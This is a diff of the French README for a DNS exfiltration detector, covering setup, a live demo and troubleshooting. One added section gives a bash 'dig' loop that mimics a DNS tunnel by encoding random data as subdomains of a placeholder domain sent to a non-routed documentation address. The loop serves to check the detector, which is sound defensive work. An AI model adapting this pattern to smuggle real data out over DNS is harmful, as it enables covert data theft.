@@ -68,7 +68,7 @@ docker compose up -d --build                    # premier build : ~1 Go à tél�
 Ouvrir <http://localhost:8501>. Vérifier que la capture tourne :
 
 ```bash
-docker compose ps                 # deux services « running »
+docker compose ps                 # deux services « Up » (le dashboard « healthy »)
 docker compose logs -f sniff      # « Capture DNS sur eth0… » puis les requêtes suspectes
 ```
 
@@ -79,6 +79,23 @@ Variables de `.env` :
 | `EXFILDNS_INTERFACE` | Interface à surveiller (obligatoire) | — |
 | `TZ` | Fuseau des heures affichées (le conteneur est en UTC sinon) | `Europe/Paris` |
 | `EXFILDNS_PORT` | Port local du dashboard | `8501` |
+
+### Vérifier la détection
+
+Sans outil d'attaque, une boucle `dig` produit des requêtes de la même forme qu'un tunnel
+(numéro de morceau, données aléatoires, domaine fictif). Elles sont envoyées à `192.0.2.53`,
+adresse réservée à la documentation et non routée : rien ne part vers un vrai serveur.
+
+```bash
+for i in $(seq 1 10); do
+  dig +short +tries=1 +time=1 @192.0.2.53 \
+    "$i.$(head -c 30 /dev/urandom | base64 | tr '+/' '-_' | tr -d '=').exfil-test.example"
+done
+```
+
+Les 10 requêtes s'affichent dans `docker compose logs sniff` et le dashboard lève une alerte
+vers `exfil-test.example`. Ce n'est qu'un test de l'installation : la démonstration utilise un
+vrai outil d'exfiltration (section 5).
 
 Arrêt : `docker compose stop` (la capture s'arrête proprement et affiche son bilan).
 Les détections restent dans le volume `detections` ; `docker compose down -v` les efface.
@@ -100,6 +117,9 @@ sudo .venv/bin/exfildns sniff -i eth0 --base detections.db
 uv run exfildns dashboard --base detections.db
 ```
 
+Une base créée avec `sudo` appartient à root : pour passer ensuite à la variante ci-dessous,
+la supprimer (`sudo rm detections.db*`) ou en choisir une autre.
+
 Pour éviter `sudo`, donner la capacité de capture à une **copie** de l'interpréteur, comme
 dans l'image Docker (le faire sur l'interpréteur commun l'accorderait à tous les scripts) :
 
@@ -115,10 +135,12 @@ sudo setcap cap_net_raw+ep .venv/bin/python-capture
    (période « 15 dernières minutes »). Navigation normale : les requêtes s'affichent en bleu,
    « Aucune alerte ».
 2. **Exfiltrer** : depuis un poste dont le trafic DNS passe par l'interface surveillée, lancer
-   l'outil d'exfiltration vers le domaine de l'attaquant (protocole du homelab, issue #42).
+   l'outil d'exfiltration vers le domaine de l'attaquant. *Outil et protocole à compléter avec
+   l'issue #42 (homelab) ; d'ici là, la boucle `dig` de la section 3 ou le plan B ci-dessous.*
 3. **Détecter** : en quelques secondes, les requêtes apparaissent en rouge dans le graphique,
-   le bandeau d'alerte nomme le domaine de l'attaquant et le poste source ; le tableau des
-   requêtes montre les données encodées dans les noms.
+   le bandeau d'alerte nomme le domaine de l'attaquant ; le tableau « Postes à l'origine des
+   requêtes suspectes » donne l'adresse du poste, celui des requêtes montre les données
+   encodées dans les noms.
 4. **Expliquer** : régler le seuil et le nombre de requêtes par alerte dans la barre latérale
    pour montrer leur effet ; renvoyer au notebook pour la méthode.
 
@@ -127,14 +149,15 @@ sudo setcap cap_net_raw+ep .venv/bin/python-capture
 Si le réseau de la salle empêche la démonstration en direct, l'onglet **Analyser une
 capture** du dashboard accepte un fichier `.pcap` (jusqu'à 100 Mo) et affiche les mêmes vues :
 par exemple `data/Attacks/heavy_text.pcap` du dataset (1 alerte, 26 907 requêtes suspectes sur
-27 142) puis `data/Benign/benign_heavy_2.pcap` (aucune alerte). Le même résultat s'obtient en
-ligne de commande avec `exfildns scan <fichier>`.
+27 142) puis `data/Benign/benign_heavy_2.pcap` (aucune alerte). Les paquets du dataset étant
+tronqués, l'alerte porte sur « (nom incomplet dans la capture) » et non sur un nom de domaine.
+Le même résultat s'obtient en ligne de commande avec `uv run exfildns scan <fichier>`.
 
 ## 6. Dépannage
 
 | Symptôme | Cause probable | Solution |
 |---|---|---|
-| `sniff` redémarre en boucle | modèle absent, interface inconnue | `docker compose logs sniff` donne la cause |
+| `sniff` redémarre en boucle | modèle absent ou illisible, interface inconnue | `docker compose logs sniff` donne la cause ; le modèle doit être lisible par tous (`chmod 644`) |
 | Aucune requête dans le dashboard | mauvaise interface | interface de `ip route get 1.1.1.1` |
 | « Droits insuffisants pour capturer » | ni root ni `CAP_NET_RAW` | voir section 4 |
 | « Capture impossible : … libpcap » | libpcap absent (hors Docker) | installer `libpcap0.8` / `libpcap` |
